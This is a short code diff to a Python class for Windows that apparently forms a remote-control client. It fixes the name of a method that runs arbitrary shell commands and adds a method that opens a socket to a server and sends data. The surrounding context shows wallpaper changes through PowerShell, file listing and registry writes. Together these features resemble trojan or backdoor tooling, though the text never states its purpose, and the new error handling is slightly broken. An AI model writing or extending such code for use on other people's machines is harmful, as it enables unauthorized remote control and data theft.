@@ -88,7 +88,7 @@ Set-WallPaper("""+path_file+""")
         os.remove('wall.ps1')
         return True
     
-    async def rub_command(self , command) -> str:
+    async def run_command(self , command) -> str:
         return subprocess.getoutput(command)
     
     async def get_files(self) -> list:
@@ -145,5 +145,16 @@ Set-WallPaper("""+path_file+""")
             _winreg.CloseKey(reg_key)
             return True
         except WindowsError:
-            raise WindowsError("There was an error setting the registry key")    
+            raise WindowsError("There was an error setting the registry key")   
+ 
+    async def connect_to_server(self , server_address : str , port_address : str , data : bytes = None) -> socket.socket: 
+         sock = socket.socket() 
+         try: 
+             sock.connect((server_address , port_address)) 
+             sock.send(data) 
+             return sock 
+         except Exception: 
+             raise Exception("Connection is not possible")     
+         except: 
+             return False
         
